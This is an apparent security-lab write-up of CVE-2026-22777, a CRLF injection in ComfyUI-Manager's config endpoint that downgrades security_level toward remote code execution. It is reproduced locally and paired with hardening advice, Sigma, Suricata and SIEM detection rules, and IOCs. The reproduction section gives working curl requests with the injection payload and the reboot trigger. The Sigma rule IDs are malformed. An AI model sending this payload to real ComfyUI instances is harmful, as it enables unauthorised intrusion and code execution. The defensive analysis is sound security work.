# CVE-2026-22777 — ComfyUI-Manager CRLF Injection in Configuration Handler

## 1. Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2026-22777 |
| Product | ComfyUI-Manager < 3.39.2 / 4.0.0–4.0.4 |
| Attack Vector | Network (URL query parameter, no auth needed) |
| Impact | Security Level Downgrade → Remote Code Execution |
| CVSS 3.1 | 9.8 Critical |
| Patch | 3.39.2 / 4.0.5+ |
| Prerequisite | ComfyUI started with `--listen` (network-accessible) |

ComfyUI is a node-based Stable Diffusion GUI. ComfyUI-Manager is its official extension manager. CVE-2025-67303 showed that config could be overwritten via `/userdata/` API; v3.38 fixed this by moving config to a protected `__manager` directory. However, the `write_config()` function still doesn't sanitize CRLF characters. An attacker can inject `\r` (carriage return) into query parameters of `/api/manager/db_mode`, causing Python's `configparser` to parse the injected content as a new key-value pair — downgrading `security_level` from `normal` to `weak` and enabling malicious custom node installation for RCE.

## 2. Attack Chain

```
Recon: Identify ComfyUI instance on :8188 (--listen mode)
  └─▶ Verify: GET /userdata/ComfyUI-Manager%2Fconfig.ini → 404 (old path patched)
      └─▶ Inject: GET /api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak
          └─▶ Restart: POST /api/manager/reboot (apply new config)
              └─▶ RCE: Install malicious custom node (security_level=weak allows it)
```

## 3. Reproduction

### Environment

```bash
cd ~/Security/tools/vulhub/comfyui/CVE-2026-22777
docker compose up -d
# ComfyUI-Manager 3.39.1 on port 8188
# Wait ~15s for Python app initialization
```

### Step 2 — CRLF Injection to Downgrade Security Level

```bash
curl -s --noproxy '*' -D - \
  "http://127.0.0.1:8188/api/manager/db_mode?value=cache%0Dsecurity_level%20=%20weak"
# HTTP/1.1 200 OK
# The %0D (carriage return) causes configparser to parse
# "security_level = weak" as a separate key-value pair
```

### Step 3 — Verify Config Modification

```bash
docker exec cve-2026-22777-web-1 cat /ComfyUI/user/__manager/config.ini
# [default]
# ...
# security_level = normal        ← original value
# ...
# db_mode = cache\rsecurity_level = weak   ← injected via CRLF
```

When `configparser` re-reads this file, the `\r` acts as a line separator, creating a duplicate `security_level` key with value `weak` that overrides the original `normal`.

### Step 4 — Restart to Apply (completes the chain)

```bash
curl -s --noproxy '*' -X POST http://127.0.0.1:8188/api/manager/reboot
# After restart, security_level=weak is active
# Attacker can now install malicious custom nodes for RCE
```

### Cleanup

```bash
cd ~/Security/tools/vulhub/comfyui/CVE-2026-22777
docker compose down -v
```

## 4. Lessons Learned

- **Incomplete fix creates new attack surface**: Moving config to a protected directory (CVE-2025-67303 fix) didn't address the root cause — unsanitized user input in config writes.
- **CRLF injection in config files**: Any function that writes user input to structured config files (INI, YAML, properties) must strip `\r` and `\n` characters.
- **Security-critical settings must not be writable via API**: `security_level` should require manual file editing or a separate privileged endpoint.
- **Network exposure amplifies local vulns**: The `--listen` flag turns a local tool into a network-accessible attack surface.

## 5. Defense

### 5.1 Hardening

| Layer | Action |
|-------|--------|
| Application | Upgrade ComfyUI-Manager to ≥ 3.39.2 / 4.0.5 |
| Network | Never expose ComfyUI to untrusted networks; avoid `--listen` without firewall rules |
| Reverse Proxy | If network access needed, place behind auth proxy (nginx basic auth / OAuth) |
| Input Validation | Strip `\r`, `\n`, `\x00` from all config write parameters |
| Monitoring | Alert on changes to `security_level` in config.ini |

### 5.2 Detection — Sigma Rules

```yaml
title: ComfyUI-Manager CRLF Injection via Configuration Endpoint (CVE-2026-22777)
id: 9e5f2b34-6a0d-4c4g-c3e8-1d7f9g4b0c23
status: experimental
description: >
  Detects CRLF injection attempts against ComfyUI-Manager configuration
  endpoints. The %0D or %0A in query parameters indicates an attempt to
  inject new key-value pairs into config.ini.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-22777
  - https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2
author: Security Lab
date: 2026/01/20
modified: 2026/05/21
tags:
  - attack.initial_access
  - attack.t1190
  - attack.defense_evasion
  - attack.t1562.001
  - cve.2026.22777
logsource:
  category: webserver
  service: access
detection:
  selection_endpoint:
    cs_uri_path|startswith: '/api/manager/'
  selection_crlf:
    cs_uri_query|contains:
      - '%0D'
      - '%0A'
      - '%0d'
      - '%0a'
  condition: selection_endpoint and selection_crlf
falsepositives:
  - Legitimate URL-encoded content in manager API parameters (very unlikely)
level: critical
```

```yaml
title: ComfyUI-Manager Security Level Downgrade Attempt
id: 9e5f2b34-6a0d-4c4g-c3e8-1d7f9g4b0c24
status: experimental
description: >
  Detects attempts to inject security_level=weak into ComfyUI-Manager
  configuration via any endpoint. This is the specific exploitation goal
  of CVE-2026-22777.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-22777
author: Security Lab
date: 2026/01/20
tags:
  - attack.defense_evasion
  - attack.t1562.001
  - cve.2026.22777
logsource:
  category: webserver
  service: access
detection:
  selection:
    cs_uri_query|contains: 'security_level'
    cs_uri_path|startswith: '/api/manager/'
  condition: selection
falsepositives:
  - None expected — security_level should never appear in query parameters
level: critical
```

### 5.3 Detection — Suricata Rules

```
alert http any any -> $HOME_NET any ( \
  msg:"CVE-2026-22777 ComfyUI-Manager CRLF Injection - %0D/%0A in Manager API"; \
  flow:to_server,established; \
  http.uri; content:"/api/manager/"; \
  http.uri; content:"%0"; nocase; \
  classtype:web-application-attack; \
  sid:2026022777; rev:1; \
  metadata:cve CVE-2026-22777, attack_target web_server, \
           mitre_tactic initial_access, mitre_technique T1190; \
  reference:cve,2026-22777; \
)

alert http any any -> $HOME_NET any ( \
  msg:"CVE-2026-22777 ComfyUI-Manager Security Level Downgrade via CRLF"; \
  flow:to_server,established; \
  http.uri; content:"/api/manager/"; \
  http.uri; content:"security_level"; nocase; \
  classtype:web-application-attack; \
  sid:2026022778; rev:1; \
  metadata:cve CVE-2026-22777, attack_target web_server, \
           mitre_tactic defense_evasion, mitre_technique T1562.001; \
  reference:cve,2026-22777; \
)

alert http any any -> $HOME_NET any ( \
  msg:"CVE-2026-22777 ComfyUI-Manager Reboot After Config Injection"; \
  flow:to_server,established; \
  http.uri; content:"/api/manager/reboot"; \
  classtype:web-application-attack; \
  sid:2026022779; rev:1; \
  metadata:cve CVE-2026-22777, attack_target web_server, \
           mitre_tactic persistence, mitre_technique T1059; \
  reference:cve,2026-22777; \
)
```

### 5.4 IOC Table

| Type | Indicator | Context |
|------|-----------|---------|
| URL Pattern | `/api/manager/db_mode?value=...%0D...` | CRLF injection delivery |
| URL Pattern | `/api/manager/reboot` | Config reload trigger (post-injection) |
| URL-encoded | `%0D` or `%0A` in `/api/manager/` query params | CRLF characters in config write |
| Config Keyword | `security_level` in URL query string | Targeted setting for downgrade |
| Config Change | `security_level = weak` in config.ini | Successful exploitation indicator |
| Behavioral | Custom node installation after security downgrade | RCE chain completion |
| Software | ComfyUI-Manager < 3.39.2 or 4.0.0–4.0.4 | Vulnerable versions |
| Network | ComfyUI on port 8188 accessible from non-localhost | Prerequisite exposure |

### 5.5 SIEM Hunting Queries

**Splunk SPL — Detect CRLF injection in ComfyUI-Manager API:**

```spl
index=web sourcetype=access_combined OR sourcetype=nginx:access
  uri_path="/api/manager/*"
| where like(uri_query, "%\%0D%") OR like(uri_query, "%\%0A%")
        OR like(uri_query, "%\%0d%") OR like(uri_query, "%\%0a%")
| eval payload=urldecode(uri_query)
| eval targets_security=if(like(payload, "%security_level%"), "YES", "NO")
| stats count min(_time) as first_seen max(_time) as last_seen
        values(uri_path) as endpoints
        values(targets_security) as security_targeted
        by src_ip
| sort - count
```

**Splunk SPL — ComfyUI reboot requests (post-exploitation indicator):**

```spl
index=web sourcetype=access_combined OR sourcetype=nginx:access
  uri_path="/api/manager/reboot"
| stats count min(_time) as first_seen max(_time) as last_seen by src_ip
| where count >= 1
| sort - last_seen
```

**Microsoft Sentinel KQL — CRLF injection in ComfyUI-Manager endpoints:**

```kql
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem startswith "/api/manager/"
| where csUriQuery has_any ("%0D", "%0A", "%0d", "%0a")
| extend decoded_query = url_decode(csUriQuery)
| extend targets_security = decoded_query has "security_level"
| project TimeGenerated, cIP, csUriStem, csUriQuery, decoded_query, targets_security
| summarize attempt_count = count(),
            endpoints = make_set(csUriStem),
            security_targeted = make_set(targets_security),
            first_seen = min(TimeGenerated),
            last_seen = max(TimeGenerated)
        by cIP
| sort by attempt_count desc
```

**Microsoft Sentinel KQL — ComfyUI config tampering chain (injection + reboot):**

```kql
let crlf_injectors = W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem startswith "/api/manager/"
| where csUriQuery has_any ("%0D", "%0A", "%0d", "%0a")
| distinct cIP;
W3CIISLog
| where TimeGenerated > ago(24h)
| where csUriStem == "/api/manager/reboot"
| where cIP in (crlf_injectors)
| project TimeGenerated, cIP, csUriStem, csMethod
| sort by TimeGenerated desc
```

## 6. Tools & References

| Tool | Purpose |
|------|---------|
| curl | HTTP request with URL-encoded CRLF payload |
| docker / vulhub | Local vulnerable environment |

- [GitHub Advisory — GHSA-562r-8445-54r2](https://github.com/Comfy-Org/ComfyUI-Manager/security/advisories/GHSA-562r-8445-54r2)
- [NVD — CVE-2026-22777](https://nvd.nist.gov/vuln/detail/CVE-2026-22777)
- [CVE-2025-67303 (predecessor)](https://github.com/vulhub/vulhub/tree/master/comfyui/CVE-2025-67303)

## 7. Disclaimer

This reproduction was performed in an isolated Docker environment (vulhub) on localhost for educational purposes only. No production systems were targeted. The goal is to understand the vulnerability mechanism and develop effective detection/hardening strategies.
